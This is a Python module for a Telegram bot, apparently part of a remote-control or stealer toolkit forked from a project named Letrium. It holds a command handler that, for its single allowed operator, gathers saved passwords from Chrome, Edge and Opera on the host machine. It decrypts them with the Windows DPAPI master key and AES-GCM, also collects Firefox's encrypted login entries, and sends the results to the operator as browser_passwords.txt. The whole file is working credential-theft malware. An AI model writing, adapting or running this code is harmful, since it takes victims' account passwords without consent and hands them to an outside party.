##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/

# forked from https://github.com/cybermads/Letrium.git
# author: cyberman

from aiogram import  types, F
from aiogram.filters import Command
from config import ALLOWED_USER_ID
from Cryptodome.Cipher import AES

import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import tempfile

LOCAL = os.getenv("LOCALAPPDATA")
APPDATA = os.getenv("APPDATA")

PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    'Opera': os.path.join(LOCAL, 'Opera Software', 'Opera Stable'),
    'Firefox': os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
}

def register_password_handler(dp):

    def encrypt_chrome_key(path):
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
                key_b64 = json.load(f)["os_crypt"]["encrypted_key"]
            key = base64.b64decode(key_b64)[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception:
            return None

    def decrypt_chrome_password(buff, key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except Exception:
            try:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
            except Exception:
                return ""

    async def extract_firefox_passwords(profile_path):
        # Очень упрощённый пример без полноценной decryption,
        # для реального декодирования нужно sqlite и key4.db обработка.
        # Здесь просто считываем logins.json и показываем зашифрованные пароли.
        logins_path = os.path.join(profile_path, "logins.json")
        if not os.path.exists(logins_path):
            return []
        try:
            with open(logins_path, "r", encoding="utf-8") as f:
                logins_data = json.load(f)
            results = []
            for login in logins_data.get("logins", []):
                results.append({
                    "browser": "Firefox",
                    "profile": os.path.basename(profile_path),
                    "url": login.get("hostname"),
                    "username": login.get("encryptedUsername"),
                    "password": login.get("encryptedPassword"),
                    "note": "Пароли зашифрованы, требуется дополнительное расшифрование."
                })
            return results
        except Exception:
            return []
    
    @dp.message(F.text.lower() == "пароли браузера")
    @dp.message(Command("passwords"))
    async def extract_passwords(message: types.Message):
        if message.from_user.id == ALLOWED_USER_ID:
            res = []

            for browser, base_path in PATHS.items():
                if not os.path.exists(base_path):
                    continue

                if browser == "Firefox":
                    # Для Firefox перебираем профили
                    for profile in os.listdir(base_path):
                        profile_path = os.path.join(base_path, profile)
                        if not os.path.isdir(profile_path):
                            continue
                        res.extend(await extract_firefox_passwords(profile_path))
                    continue

                key = encrypt_chrome_key(base_path)
                if not key:
                    continue

                profiles = [p for p in os.listdir(base_path) if p == "Default" or p.startswith("Profile")]
                if browser == "Opera":
                    profiles = [""]  

                for profile in profiles:
                    db_path = os.path.join(base_path, profile, "Login Data") if profile else os.path.join(base_path, "Login Data")
                    if not os.path.exists(db_path):
                        continue

                    tmp_db = os.path.join(os.getenv("TEMP"), f"{browser.lower()}_logins_tmp.db")
                    try:
                        shutil.copy2(db_path, tmp_db)
                        conn = sqlite3.connect(tmp_db)
                        cur = conn.cursor()
                        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for url, username, pwd_encrypted in cur.fetchall():
                            if not username and not pwd_encrypted:
                                continue
                            password = decrypt_chrome_password(pwd_encrypted, key)
                            res.append({
                                "browser": browser,
                                "profile": profile if profile else "Default",
                                "url": url,
                                "username": username,
                                "password": password
                            })
                        cur.close()
                        conn.close()
                    except Exception:
                        pass
                    finally:
                        if os.path.exists(tmp_db):
                            os.remove(tmp_db)

            if not res:
                await message.answer("Ничего не найдено.")
                return

            text_lines = []
            for item in res:
                if item.get("browser") == "Firefox":
                    line = f"[{item['browser']}] ({item['profile']}) URL: {item['url']}\nUsername (encrypted): {item['username']}\nPassword (encrypted): {item['password']}\nNote: {item.get('note', '')}\n"
                else:
                    line = f"[{item['browser']}] ({item['profile']}) URL: {item['url']}\nUsername: {item['username']}\nPassword: {item['password']}\n"
                text_lines.append(line)

            full_text = "\n".join(text_lines)

            tmp_file_path = None
            try:
                with tempfile.NamedTemporaryFile("w+", encoding="utf-8", delete=False, suffix=".txt") as tmp_file:
                    tmp_file.write(full_text)
                    tmp_file_path = tmp_file.name

                await message.answer_document(types.FSInputFile(tmp_file_path, filename="browser_passwords.txt"))
            finally:
                if tmp_file_path and os.path.exists(tmp_file_path):
                    os.remove(tmp_file_path)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")